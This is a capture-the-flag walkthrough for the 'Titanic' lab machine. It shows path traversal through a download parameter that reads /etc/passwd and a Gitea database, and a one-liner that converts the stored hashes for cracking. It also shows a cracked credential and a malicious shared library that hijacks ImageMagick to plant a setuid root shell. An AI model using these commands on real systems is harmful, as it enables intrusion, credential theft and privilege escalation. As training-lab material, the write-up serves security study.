# titanic (easy)
# user flag 
## 1. Rustscan
```
Nmap scan report for titanic.htb (10.129.141.86)
Host is up, received echo-reply ttl 63 (0.22s latency).
Scanned at 2025-02-20 20:51:56 EST for 19s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 73:03:9c:76:eb:04:f1:fe:c9:e9:80:44:9c:7f:13:46 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGZG4yHYcDPrtn7U0l+ertBhGBgjIeH9vWnZcmqH0cvmCNvdcDY/ItR3tdB4yMJp0ZTth5itUVtlJJGHRYAZ8Wg=
|   256 d5:bd:1d:5e:9a:86:1c:eb:88:63:4d:5f:88:4b:7e:04 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDT1btWpkcbHWpNEEqICTtbAcQQitzOiPOmc3ZE0A69Z
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-favicon: Unknown favicon MD5: 79E1E0A79A613646F473CFEDA9E231F1
|_http-title: Titanic - Book Your Ship Trip
| http-server-header: 
|   Apache/2.4.52 (Ubuntu)
|_  Werkzeug/3.0.3 Python/3.10.12
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## 2. Get users

``` bash=
┌──(kali㉿kali)-[~/Desktop/htb]
└─$ curl --path-as-is -i -s -k -X $'GET' \
    -H $'Host: titanic.htb' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate, br' -H $'Origin: http://titanic.htb' -H $'Connection: keep-alive' -H $'Referer: http://titanic.htb/book' -H $'Upgrade-Insecure-Requests: 1' \
    $'http://titanic.htb/download?ticket=/etc/passwd' | grep sh  
root:x:0:0:root:/root:/bin/bash
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
developer:x:1000:1000:developer:/home/developer:/bin/bash
```
## 3. Get vhosts

```bash
127.0.0.1 localhost titanic.htb dev.titanic.htb
127.0.1.1 titanic

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

## 4. Get gitea config
``` bash
# in docker file: 
version: '3'

services:
  gitea:
    image: gitea/gitea
    container_name: gitea
    ports:
      - "127.0.0.1:3000:3000"
      - "127.0.0.1:2222:22"  # Optional for SSH access
    volumes:
      - /home/developer/gitea/data:/data # Replace with your path
    environment:
      - USER_UID=1000
      - USER_GID=1000
    restart: always

# in data find /home/developer/gitea/data/gitea/conf/app.ini
[database]
PATH = /data/gitea/gitea.db
DB_TYPE = sqlite3
HOST = localhost:3306
NAME = gitea
USER = root
PASSWD = 
LOG_SQL = false
SCHEMA = 
SSL_MODE = disable

# get gitea.db
curl --path-as-is -i -s -k -X $'GET' \ -H $'Host: titanic.htb' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate, br' -H $'Origin: http://titanic.htb' -H $'Connection: keep-alive' -H $'Referer: http://titanic.htb/book' -H $'Upgrade-Insecure-Requests: 1' \ $'http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/gitea.db' > gitea.db


# convet to hashcat format
sqlite3 gitea.db "select passwd,salt,name from user" | while read data; do digest=$(echo "$data" | cut -d'|' -f1 | xxd -r -p | base64); salt=$(echo "$data" | cut -d'|' -f2 | xxd -r -p | base64); name=$(echo $data | cut -d'|' -f 3); echo "${name}:sha256:50000:${salt}:${digest}"; done | tee gitea.hashes administrator:sha256:50000:LRSeX70bIM8x2z48aij8mw==:y6IMz5J9OtBWe2gWFzLT+8oJjOiGu8kjtAYqOWDUWcCNLfwGOyQGrJIHyYDEfF0BcTY=

# cracked hash
sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=:25282528
```

# root flag
## 1. Network config
```bash
$ developer@titanic:/etc/apache2$ ss -ltnp
State       Recv-Q      Send-Q           Local Address:Port            Peer Address:Port      Process                                 
LISTEN      0           4096             127.0.0.53%lo:53                   0.0.0.0:*                                                 
LISTEN      0           4096                 127.0.0.1:37423                0.0.0.0:*                                                 
LISTEN      0           4096                 127.0.0.1:3000                 0.0.0.0:*                                                 
LISTEN      0           128                  127.0.0.1:5000                 0.0.0.0:*          users:(("python3",pid=1141,fd=3))      
LISTEN      0           4096                 127.0.0.1:2222                 0.0.0.0:*                                                 
LISTEN      0           128                    0.0.0.0:22                   0.0.0.0:*                                                 
LISTEN      0           128                       [::]:22                      [::]:*                                                 
LISTEN      0           511                          *:80                         *:*                                                 

$ developer@titanic:/etc/apache2/sites-available$ ll
total 28
drwxr-xr-x 2 root root 4096 Feb  7 10:37 ./
drwxr-xr-x 8 root root 4096 Feb  7 10:37 ../
-rw-r--r-- 1 root root  571 Jan 29 11:09 000-default.conf
-rw-r--r-- 1 root root 6338 Dec  4  2023 default-ssl.conf
-rw-r--r-- 1 root root  342 Feb  5 14:52 gitea-titanic.conf
-rw-r--r-- 1 root root  570 Jan 29 11:01 titanic.conf


$ developer@titanic:/etc/apache2/sites-available$ cat titanic.conf 
<VirtualHost *:80>
    ServerName titanic.htb
    DocumentRoot /var/www/html

    <Directory /var/www/html>
        Options Indexes FollowSymLinks
        AllowOverride All
        Require all granted
    </Directory>

    ProxyRequests Off
    ProxyPass / http://127.0.0.1:5000/
    ProxyPassReverse / http://127.0.0.1:5000/

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
    
    
    RewriteEngine On
    RewriteCond %{HTTP_HOST} !^titanic.htb$
    RewriteRule ^(.*)$ http://titanic.htb$1 [R=permanent,L]
</VirtualHost>

$ developer@titanic:/etc/apache2/sites-available$ cat gitea-titanic.conf 
<VirtualHost *:80>
    ServerName dev.titanic.htb

    ProxyRequests Off
    ProxyPass / http://127.0.0.1:3000/
    ProxyPassReverse / http://127.0.0.1:3000/

    <Location />
        Require all granted
    </Location>

    ErrorLog ${APACHE_LOG_DIR}/gitea-error.log
    CustomLog ${APACHE_LOG_DIR}/gitea-access.log combined

</VirtualHost>
```


## 2. Run linpeas.sh and Find this 
```bash
╔══════════╣ Unexpected in /opt (usually empty)
total 20                                                                                                                              
drwxr-xr-x  5 root root      4096 Feb  7 10:37 .
drwxr-xr-x 19 root root      4096 Feb  7 10:37 ..
drwxr-xr-x  5 root developer 4096 Feb  7 10:37 app
drwx--x--x  4 root root      4096 Feb  7 10:37 containerd
drwxr-xr-x  2 root root      4096 Feb  7 10:37 scripts
```

=> https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8

This result in while the `ImageMagick` is executing, it might use current working directory as the path to search for the configuration file or shared libraries, because empty path in these environment variables means the current working directory.

## 3. exploit
```c
developer@titanic:/opt/app/static/assets/images$ gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    system("cp /bin/bash /opt/scripts/bash; chmod 4777 /opt/scripts/bash;");
exit(0);
}
EOF


developer@titanic:/opt/scripts$ ./bash -p
bash-5.1# id
uid=1000(developer) gid=1000(developer) euid=0(root) groups=1000(developer)
```